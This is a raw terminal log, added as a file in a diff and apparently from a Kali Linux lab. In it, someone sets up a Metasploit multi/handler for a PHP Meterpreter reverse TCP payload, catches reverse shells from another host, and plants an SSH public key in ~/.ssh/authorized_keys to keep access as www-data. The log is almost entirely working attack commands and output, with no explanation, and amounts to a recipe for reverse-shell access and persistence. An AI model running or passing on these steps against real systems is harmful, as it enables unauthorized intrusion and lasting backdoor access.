@@ -1,0 +1,143 @@
+zsh: corrupt history file /home/kali/.zsh_history
+┌──(kali㉿kali)-[~]
+└─$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.56.101  netmask 255.255.255.0  broadcast 192.168.56.255
+        inet6 fe80::cb58:eed2:1479:64d6  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:d1:f8:5d  txqueuelen 1000  (Ethernet)
+        RX packets 2  bytes 876 (876.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 25  bytes 3214 (3.1 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 8  bytes 480 (480.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 480 (480.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+                                                                                                     
+┌──(kali㉿kali)-[~]
+└─$ ping 192.168.56.102
+PING 192.168.56.102 (192.168.56.102) 56(84) bytes of data.
+64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=2.99 ms
+64 bytes from 192.168.56.102: icmp_seq=2 ttl=64 time=3.07 ms
+64 bytes from 192.168.56.102: icmp_seq=3 ttl=64 time=2.79 ms
+64 bytes from 192.168.56.102: icmp_seq=4 ttl=64 time=2.71 ms
+^C
+--- 192.168.56.102 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+rtt min/avg/max/mdev = 2.706/2.889/3.071/0.146 ms
+                                                                                                     
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: Enable verbose logging with set VERBOSE true
+                                                  
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+                                                                                                     
+     Trace program: running                                                                          
+                                                                                                     
+           wake up, Neo...                                                                           
+        the matrix has you                                                                           
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com
+
+
+       =[ metasploit v6.4.64-dev                          ]
++ -- --=[ 2519 exploits - 1296 auxiliary - 431 post       ]
++ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+use exploit/multi/handlermsf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
+payload => php/meterpreter_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.56.101
+LHOST => 192.168.56.101
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.56.101:4444 
+[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:56315) at 2025-09-18 19:28:25 +0800
+
+meterpreter > ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ""
+[-] Unknown command: ssh-keygen. Run the help command for more details.
+meterpreter > ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ""
+[-] Unknown command: ssh-keygen. Run the help command for more details.
+meterpreter > ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ""
+[-] Unknown command: ssh-keygen. Run the help command for more details.
+meterpreter > upload id_rsa.pub /tmp/id_rsa.pub
+[*] Uploading  : /home/kali/id_rsa.pub -> /tmp/id_rsa.pub
+[*] Uploaded -1.00 B of 391.00 B (-0.26%): /home/kali/id_rsa.pub -> /tmp/id_rsa.pub
+[*] Completed  : /home/kali/id_rsa.pub -> /tmp/id_rsa.pub
+meterpreter > shell
+Process 4795 created.
+Channel 1 created.
+mkdir -p ~/.ssh
+cat /tmp/id_rsa.pub >> ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+
+[*] 192.168.56.102 - Meterpreter session 1 closed.  Reason: Died
+^C
+Terminate channel 1? [y/N]  n
+
+Terminate channel 1? [y/N]  N
+
+Terminate channel 1? [y/N]  N
+
+Terminate channel 1? [y/N]  y
+[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions --interact <id> --timeout <value>                                                                                  
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.56.101:4444 
+[*] Meterpreter session 2 opened (192.168.56.101:4444 -> 192.168.56.102:41500) at 2025-09-18 19:34:47 +0800
+
+meterpreter > shell
+Process 4809 created.
+Channel 0 created.
+
+[*] 192.168.56.102 - Meterpreter session 2 closed.  Reason: Died
+^C
+Terminate channel 0? [y/N]  y
+[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions --interact <id> --timeout <value>                                                                                  
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.56.101:4444 
+[*] Meterpreter session 3 opened (192.168.56.101:4444 -> 192.168.56.102:52785) at 2025-09-18 19:59:11 +0800
+
+meterpreter > shell
+Process 4872 created.
+Channel 0 created.
+mkdir -p ~/.ssh
+cat /tmp/id_rsa.pub >> ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+rm /tmp/id_rsa.pub
+exit
+meterpreter > shell
+Process 4885 created.
+Channel 1 created.
+whoami
+www-data
